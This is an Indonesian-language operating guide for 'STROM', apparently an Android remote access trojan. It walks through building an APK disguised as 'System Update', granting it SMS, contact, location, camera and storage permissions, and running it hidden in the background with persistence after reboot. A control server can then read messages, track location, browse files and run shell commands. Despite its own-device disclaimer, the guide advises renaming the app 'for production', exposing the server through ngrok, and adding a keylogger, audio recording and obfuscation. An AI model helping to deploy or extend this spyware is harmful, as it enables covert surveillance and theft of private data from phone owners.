╔════════════════════════════════════════════════════════════════╗
║         ANDROID REMOTE ACCESS - TESTING GUIDE                  ║
║         Untuk Testing di HP Sendiri                            ║
╚════════════════════════════════════════════════════════════════╝

⚠️  PERINGATAN LEGAL
══════════════════════════════════════════════════════════════════
Tool ini HANYA untuk testing keamanan di perangkat MILIK SENDIRI.
Penggunaan tanpa izin adalah ILEGAL dan melanggar hukum.


📋 PERSIAPAN
══════════════════════════════════════════════════════════════════

1. REQUIREMENTS:
   - Python 3.x dengan dependencies terpasang
   - HP Android (API 21+, Android 5.0+)
   - Komputer dan HP dalam jaringan yang sama
   - Android Studio (untuk build APK)

2. INSTALL DEPENDENCIES:
   cd /home/attazy/strom
   pip3 install -r requirements.txt


🚀 CARA MENGGUNAKAN (STEP BY STEP)
══════════════════════════════════════════════════════════════════

STEP 1: Jalankan STROM
─────────────────────────────────────────────────────────────
cd /home/attazy/strom
python3 strom.py

Pilih menu: [9] Android Remote Access


STEP 2: Auto Setup (Termudah)
─────────────────────────────────────────────────────────────
Dalam menu Android, pilih: [6] Auto-Setup

Ini akan otomatis:
✓ Generate source code APK
✓ Start HTTP server (port 8080)
✓ Start control server (port 4444)  
✓ Generate QR code

Catat IP Address yang ditampilkan!


STEP 3: Build APK
─────────────────────────────────────────────────────────────

CARA A - Android Studio (Recommended):
────────────────────────────────────────
1. Buka Android Studio
2. File > New > New Project
3. Pilih "Empty Activity"
   - Name: SystemUpdate
   - Package: com.system.update
   - Language: Java
   - Minimum SDK: API 21

4. Copy file dari android_payload/ ke project:
   android_payload/MainActivity.java      → app/src/main/java/com/system/update/
   android_payload/RemoteService.java     → app/src/main/java/com/system/update/
   android_payload/BootReceiver.java      → app/src/main/java/com/system/update/
   android_payload/AndroidManifest.xml    → app/src/main/
   android_payload/build.gradle           → app/

5. Edit RemoteService.java:
   - Ganti SERVER_IP dengan IP komputer Anda
   - Cek di terminal STROM atau jalankan: ip addr show

6. Sync Gradle (klik Sync Now)

7. Build APK:
   Build > Build Bundle(s) / APK(s) > Build APK(s)
   
8. APK ada di: app/build/outputs/apk/debug/app-debug.apk


CARA B - Command Line (Advanced):
───────────────────────────────────
1. Install Android SDK
2. Setup project structure sesuai BUILD_INSTRUCTIONS.txt
3. Edit SERVER_IP di RemoteService.java
4. ./gradlew assembleDebug
5. APK: app/build/outputs/apk/debug/app-debug.apk


STEP 4: Install di HP
─────────────────────────────────────────────────────────────
1. Copy APK ke HP (via USB, Bluetooth, atau cloud)

2. Di HP, buka Settings:
   Settings > Security > Unknown Sources > Enable
   (Android 8+: Settings > Apps > Special Access > Install unknown apps)

3. Install APK

4. Buka aplikasi "System Update"

5. Grant semua permissions yang diminta:
   ✓ SMS
   ✓ Contacts
   ✓ Location
   ✓ Camera
   ✓ Storage
   ✓ Phone

6. App akan minimize otomatis dan berjalan di background


STEP 5: Control HP
─────────────────────────────────────────────────────────────
Kembali ke STROM di komputer:

1. Pilih menu: [4] View Connected Devices
   - Seharusnya HP Anda muncul

2. Pilih menu: [5] Control Device
   - Masukkan nomor device

3. Pilih action yang ingin ditest:
   [1] Screen Mirror
   [2] Capture Photo
   [3] Read SMS
   [4] Read Contacts
   [5] Get Location
   [6] File Browser
   [7] Shell Command
   [8] Device Info


📱 FITUR YANG BISA DITEST
══════════════════════════════════════════════════════════════════

✓ Screenshot (butuh root/permission khusus)
✓ Read SMS Messages (50 terbaru)
✓ Read Contacts (100 kontak)
✓ Get GPS Location
✓ Browse Files (/sdcard/)
✓ Execute Shell Commands
✓ Get Device Information
✓ Auto-reconnect jika terputus
✓ Persist setelah reboot (via BootReceiver)


🔧 TROUBLESHOOTING
══════════════════════════════════════════════════════════════════

❌ HP tidak connect ke server:
   ✓ Pastikan komputer & HP dalam jaringan sama
   ✓ Check IP address benar di RemoteService.java
   ✓ Pastikan server running (menu [3] Start All Servers)
   ✓ Check firewall tidak block port 4444

❌ App crash saat dibuka:
   ✓ Check logcat: adb logcat | grep RemoteService
   ✓ Pastikan semua permissions di-grant
   ✓ Check build.gradle dependencies sudah sync

❌ Permission denied errors:
   ✓ Manual grant di Settings > Apps > System Update > Permissions
   ✓ Disable battery optimization untuk app ini
   ✓ Android 11+: grant storage permission manually

❌ Screenshot tidak work:
   ✓ Screenshot butuh root atau accessibility permission
   ✓ Alternative: install ADB dan enable USB debugging

❌ Server tidak bisa diakses dari HP:
   ✓ Check dengan ping dari HP ke komputer
   ✓ Matikan firewall sementara untuk testing
   ✓ Pastikan tidak pakai VPN yang block local network


🔍 DEBUGGING
══════════════════════════════════════════════════════════════════

Cek log di HP:
──────────────
adb logcat | grep RemoteService
adb logcat | grep com.system.update

Cek connection:
───────────────
# Di HP (via terminal emulator atau ADB)
ping <IP_KOMPUTER>
telnet <IP_KOMPUTER> 4444

Cek server listening:
─────────────────────
# Di komputer
netstat -tuln | grep 4444
netstat -tuln | grep 8080


📊 MONITORING
══════════════════════════════════════════════════════════════════

Di terminal STROM akan muncul:
✓ Device connected
✓ Device info received
✓ Commands sent/received
✓ Errors (jika ada)

Di HP (via logcat):
✓ Connection attempts
✓ Command execution
✓ Error messages


💡 TIPS
══════════════════════════════════════════════════════════════════

1. Test di WiFi yang stabil
2. Disable battery saver saat testing
3. Keep screen on saat initial testing
4. Check logs untuk debugging
5. Grant semua permissions sebelum test
6. Untuk production: ubah package name & app name
7. Gunakan ngrok jika ingin test dari internet


🛡️ SECURITY NOTES
══════════════════════════════════════════════════════════════════

- Komunikasi tidak encrypted (plain JSON)
- Tidak ada autentikasi
- Tidak ada obfuscation
- HANYA untuk testing di device sendiri
- Jangan distribusikan APK ke orang lain
- Uninstall setelah selesai testing


📞 NEXT STEPS
══════════════════════════════════════════════════════════════════

Setelah basic testing berhasil, Anda bisa:

1. Add encryption untuk komunikasi
2. Add authentication mechanism
3. Implement camera capture (butuh Camera2 API)
4. Add file upload/download
5. Add keylogger feature
6. Add audio recording
7. Obfuscate code dengan ProGuard


═══════════════════════════════════════════════════════════════════
          Happy Testing! (Legal & Ethical Use Only)
═══════════════════════════════════════════════════════════════════
